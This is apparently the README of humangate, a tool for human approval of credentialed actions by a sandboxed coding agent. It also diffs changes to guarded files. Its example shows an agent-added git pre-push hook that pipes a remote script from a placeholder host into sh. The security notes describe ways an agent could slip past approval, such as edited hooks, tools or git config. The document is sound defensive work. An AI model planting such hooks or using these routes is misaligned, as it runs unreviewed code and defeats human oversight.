# humangate

Coding agents are safest in a sandbox without your keys. humangate keeps you in the loop for
what the agent can't be trusted to do alone:

- **Actions that need your keys.** The agent can't sign a commit or push a branch, so it asks
  you to run the command on the host. You see why and exactly what will run, and nothing
  happens until you say yes.
- **Files it shouldn't change behind your back.** Git hooks and config, the tools you approve
  and whatever they run. humangate shows you any change as a diff the moment it happens, and
  runs no request until you accept it.

In the sandbox, the agent asks:

```
$ humangate request --reason "Rebased onto main; signatures were lost" git-sign my-branch
humangate: request 4f93b1686d8a3142 sent; waiting for approval on the host...
```

On the host, you decide:

```
$ humangate loop
humangate loop watching /home/me/project/.humangate/queue (Ctrl-C to stop)
Tools: git-push, git-push-with-force, git-sign
Guarding: git config, .humangate/tools, ~/.humangate/tools, .humangate/guard, .git/hooks, package.json (18 files)
Log: /home/me/.humangate/logs/home-me-project.jsonl


── Request 4f93b1686d8a3142 ──

Rebased onto main; signatures were lost

.humangate/tools/git-sign my-branch

Run it? (↑/↓ and Enter, or a shortcut letter)
    n  No
  ❯ y  Yes, run it
    a  Yes, and don't ask again for this exact command (until restart)
    r  Reply to the agent instead...

Re-signing:
  9c424df Add the widget
  052b5ed Test the widget

Successfully rebased and updated refs/heads/my-branch.

Exit code 0 - result sent to the agent
```

The agent's `request` then prints the same output and exits with the tool's exit code.

If the agent edits a guarded file, say a `pre-push` hook, the loop rings the bell and shows it
right away:

```
── Guarded files changed ──

Requests are refused until you accept this or it's reverted.

.git/hooks/pre-push added
  @@ -0,0 +1,2 @@
  +#!/bin/sh
  +curl -s https://example.com/x | sh

Accept the change? (↑/↓ and Enter, or a shortcut letter)
  ❯ n  No - refuse requests until it's reverted
    y  Yes, accept it as the approved state
```

## Install

On the host, and inside the sandbox the agent runs in:

```bash
curl -fsSL https://raw.githubusercontent.com/szajbus/humangate/main/install.sh | sh
```

It installs a single Python script to `~/.local/bin/humangate` (`HUMANGATE_BIN_DIR` to
change), and needs Python 3.8+ and git. Run it again to update.

The project directory has to be shared between the sandbox and the host, writable from both -
requests travel through `.humangate/queue/` in it. Most VM and container sandboxes mount the
project that way already. It's the one channel every sandbox has, so there's no port to open
or token to hand out; the price is polling - an answer takes up to a second.

## Which credentials go where

**The agent in the sandbox gets read-only credentials; the ones that can write stay on the
host.**

| In the sandbox (read-only)                         | On the host only (write-enabled)           |
| -------------------------------------------------- | ------------------------------------------ |
| a read-only deploy key or token to fetch and clone | your commit signing key, and push access   |
| a GitHub token that can read issues and PRs        | a token that can comment, merge or release |
| read-only API keys, a viewer role in the cloud     | deploy, publish and admin credentials      |
| a read replica or read-only database user          | a database user that can write             |

Then give each write action a tool - `git-push`, `deploy-staging`, `npm-publish` - which runs
on the host, with your credentials, once you approve it. Credentials the agent never gets can't
leak through a mistake or a prompt injection.

## Use

1. Give the project some tools: executables in `.humangate/tools/`. `humangate init` adds
   ready-made ones - `git-sign`, `git-push` and `git-push-with-force` - picked from a
   checklist; `humangate init --global` adds them to `~/.humangate/tools/` on the host instead,
   for every project. Write your own for anything else (see [Tools](#tools)).
2. On the host, in the project directory, start the loop and keep it open:
   ```bash
   humangate loop
   ```
3. Tell the agent about it. `humangate init` offers to: it writes the instructions to
   `.humangate/AGENTS.md` and adds a reference to it to the project's `AGENTS.md`.
4. Optionally, list the files your tools run or read in `.humangate/guard`, so the loop tells
   you when the agent changes them (see [Guarding files](#guarding-files)). `humangate init`
   offers a starter list based on what it finds in the project.

Every project directory - every git worktree, too - has its own queue, so run one loop per
agent session.

## Tools

A tool is any executable in a project's `.humangate/tools/` or in `~/.humangate/tools/` on the
host (global tools, available in every project). It runs in the project root on the host with
the agent's arguments as-is.

The agent discovers tools with `humangate tools`. It sees the global ones only while the loop is
running: they live in your home on the host, which the sandbox can't see, so the loop lists
them for it.

- Start it with a comment header after the shebang: a `Usage:` line and a short description.
  That's what `humangate tools` shows the agent - read from the file, never by running the tool.
- Print the same header on `--help`, as the starter tools do.
- Validate every argument - they come from the agent. Refuse anything unexpected with a
  non-zero exit and a message on stderr.
- Keep it small and specific, so the command you're asked to approve says exactly what will
  happen. A `git-push <branch>` tool is easy to review; a `git <anything>` tool isn't.

## Guarding files

Your "yes" is only as good as what the approved command runs, and the agent can edit much of
that: the tools, git hooks and config (a `pre-push` hook or `core.sshCommand` can run
anything), and whatever else your tools reach into - `package.json` scripts, a `Makefile`, CI
workflows, an `.envrc`, etc. So the loop guards these files: it remembers their state when it
starts, and checks them every couple of seconds and before each request.

Always guarded: the tools, git hooks (including `core.hooksPath`), the repository's git config
except `branch.*` (git writes those itself), and `.humangate/guard` - the project's list of
more paths to guard. It takes one path or glob per line (`**` matches any depth), relative to
the project root or, with `~/`, to your home on the host. A directory covers everything in it;
`#` starts a comment:

```
# Files humangate loop guards on top of the built-in ones ...
package.json
Makefile
.github/workflows/
.envrc
```

Editing the list is a change to review like any other, so the agent can't quietly drop an
entry.

A change shows up at once as a diff (size and hash for binary files). Accept it and it becomes
the approved state; refuse it and requests are refused until it's reverted - each new request
offers the review again. Files that a change to the list starts guarding are part of the same
review, and a request isn't run if a guarded file changes while you're deciding on it.

Keep in mind:

- It detects, it doesn't prevent: the agent can still write the files, humangate just refuses
  to act until you've seen the change.
- Switching branches or rebasing changes tracked files like `package.json`, so expect to review
  those diffs after such git work.
- Every file is re-read on each check - fine for tens of files, slow for something like
  `node_modules/`. The loop warns at start if checking takes too long.

## Security

humangate assumes the agent may try to trick you, and relies on you to read what you approve.

- It only gates what the sandbox can't already do. A write-enabled credential inside the
  sandbox bypasses it entirely - keep those on the host (see
  [Which credentials go where](#which-credentials-go-where)).
- A request is only a tool name, arguments and a reason. The command shown to you is exactly
  the one that runs, with no shell involved. Control characters are stripped from what's shown,
  so it can't rewrite your terminal.
- The agent can edit what the tools run; see [Guarding files](#guarding-files).
- Tools run with your full environment, so a tool's argument checks are what keeps it from
  doing more than its name says.
- The loop refuses to start inside a workmux sandbox (`WM_SANDBOX_GUEST` set).
- Any process that can write to the project directory can queue a request - including other
  agents sharing the same sandbox. The request still needs your approval.
